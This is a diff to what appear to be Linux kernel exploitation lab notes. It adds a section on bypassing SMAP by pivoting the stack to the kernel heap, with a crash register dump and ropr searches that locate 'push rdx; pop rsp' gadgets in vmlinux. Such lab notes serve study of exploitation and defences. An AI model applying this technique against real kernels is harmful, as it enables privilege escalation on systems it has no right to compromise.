@@ -327,3 +327,43 @@ Use the following gadget:
 
 See: src/03.stack_pivot
 
+# Bypassing SMAP: Stack Pivot to kernel heap
+
+Need to assign `rsp` a heap address we can write to. From the crash caused by
+`ioctl` (in src/02.control-rip/control-rip.c), the following registers get
+overwritten:
+
+~~~
+RIP: 0010:0xffffffffdead0c00
+Code: Unable to access opcode bytes at RIP 0xffffffffdead0bd6.
+RSP: 0018:ffffc9000012fe10 EFLAGS: 00000286
+RAX: ffffffffdead0c00 RBX: ffff888002fcd400 RCX: 00000000deadbeef
+RDX: 00000000cafebabe RSI: 00000000deadbeef RDI: ffff888002fcd000
+RBP: ffffc9000012fea8 R08: 00000000cafebabe R09: 0000000000000000
+R10: 0000000000000000 R11: 0000000000000000 R12: 00000000deadbeef
+R13: ffff888002fcd000 R14: 00000000cafebabe R15: ffff888002faf700
+~~~
+
+Difficult to find useful gadgets to assign `rsp` one of the registers we control the value of, such as:
+
+~~~
+[cpey@nuc 03.stack_pivot]$ ropr vmlinux --noisy --nosys --nojop -R "mov rsp, rcx; ret;"
+
+==> Found 0 gadgets in 1.489 seconds
+[cpey@nuc 03.stack_pivot]$ ropr vmlinux --noisy --nosys --nojop -R "mov rsp, rdx; ret;"
+
+==> Found 0 gadgets in 1.476 seconds
+~~~
+
+Instead we will use:
+
+~~~
+[cpey@nuc 03.stack_pivot]$ ropr vmlinux --noisy --nosys --nojop -R "push rdx;.*pop rsp;.*ret;"
+0xffffffff811cd945: push rdx; push 0x584a8348; adc [rbx+0x41], bl; pop rsp; pop rbp; ret;
+0xffffffff813a478a: push rdx; mov ebp, 0x415bffd9; pop rsp; pop r13; pop rbp; ret;              <--
+0xffffffff814decce: push rdx; add [rbx+0x41], bl; pop rsp; pop r13; pop rbp; ret;
+
+==> Found 3 gadgets in 1.503 seconds
+~~~
+
+see: src/04.heapbof-krop/heapbof-krop.c
